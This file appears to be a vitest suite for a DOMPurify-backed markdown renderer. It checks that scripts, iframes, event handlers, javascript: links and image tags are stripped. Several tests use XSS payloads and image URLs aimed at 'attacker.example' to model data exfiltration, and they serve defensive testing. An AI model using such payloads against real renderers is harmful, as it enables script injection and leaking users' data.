import { describe, expect, it } from "vitest";
import { renderMarkdown } from "../../src/ui/render_markdown.js";

/**
 * Runs in Chromium (the `chromium` project in `vitest.config.ts`), not
 * happy-dom, and that is a correctness requirement rather than an optimisation.
 *
 * DOMPurify 3.4.8+ **silently stops sanitising under happy-dom**: `<script>`
 * and `<img>` pass straight through, and even ordinary markdown loses its `<p>`
 * wrapper. A green happy-dom run is therefore compatible with the sanitiser
 * doing nothing at all — the one failure this module must never ship.
 *
 * Verified 2026-08-07: dompurify 3.4.13 sanitises correctly here and not at all
 * under happy-dom, so the defect is happy-dom's DOM emulation rather than a
 * DOMPurify regression. That is what let the exact-version pin lift.
 *
 * It also removes a workaround this file used to need: happy-dom *eagerly
 * executed* inline `<script>` while DOMPurify parsed input into its scratch
 * document, so the suite had to stub `alert`. A real browser parses into an
 * inert context, so nothing executes and no stub is required.
 */
describe("renderMarkdown", () => {
  it("renders a single paragraph to clean, trimmed HTML", () => {
    expect(renderMarkdown("hello")).toBe("<p>hello</p>");
  });

  it("renders emphasis, code, and lists", () => {
    expect(renderMarkdown("**bold** and `code`")).toBe(
      "<p><strong>bold</strong> and <code>code</code></p>",
    );
    const list = renderMarkdown("- one\n- two");
    expect(list).toContain("<li>one</li>");
    expect(list).toContain("<li>two</li>");
  });

  it("hardens links with target and rel", () => {
    const html = renderMarkdown("[site](https://example.com)");
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it("renders embedded raw HTML when it is on the allowlist", () => {
    expect(renderMarkdown("<strong>hi</strong>")).toContain("<strong>hi</strong>");
  });

  it("strips a <script> payload", () => {
    const html = renderMarkdown("hi<script>alert(1)</script>");
    expect(html).not.toContain("<script");
    expect(html).not.toContain("alert(1)");
  });

  it("strips img entirely by default (zero-click exfiltration channel)", () => {
    const html = renderMarkdown('<img src="https://attacker.example/?d=secret" alt="pic">');
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
  });

  it("strips markdown-syntax images by default too", () => {
    const html = renderMarkdown("![pic](https://attacker.example/?d=secret)");
    expect(html).not.toContain("<img");
  });

  it("allowImages opts back in but still strips inline event handlers", () => {
    const html = renderMarkdown('<img src="https://ex.com/i.png" alt="pic" onerror="alert(1)">', {
      allowImages: true,
    });
    expect(html).toContain("<img");
    expect(html).toContain('src="https://ex.com/i.png"');
    expect(html).not.toContain("onerror");
  });

  it("neutralizes a javascript: image src under allowImages", () => {
    const html = renderMarkdown('<img src="javascript:alert(1)">', { allowImages: true });
    expect(html).not.toContain("javascript:");
  });

  it("does not mutate the shared marked singleton (no setOptions leak)", async () => {
    const { marked } = await import("marked");
    // `breaks: true` is this component's chat-style preference; the deduped
    // global `marked` a host app may also use must keep its own default.
    expect(marked.defaults.breaks).toBe(false);
    // ...while our renderer still applies it locally.
    expect(renderMarkdown("a\nb")).toContain("<br>");
  });

  it("drops disallowed tags like iframe", () => {
    const html = renderMarkdown('<iframe src="https://evil.example"></iframe>');
    expect(html).not.toContain("<iframe");
  });

  it("neutralizes javascript: links", () => {
    const html = renderMarkdown("[x](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });

  it("returns an empty string for empty input", () => {
    expect(renderMarkdown("")).toBe("");
  });
});
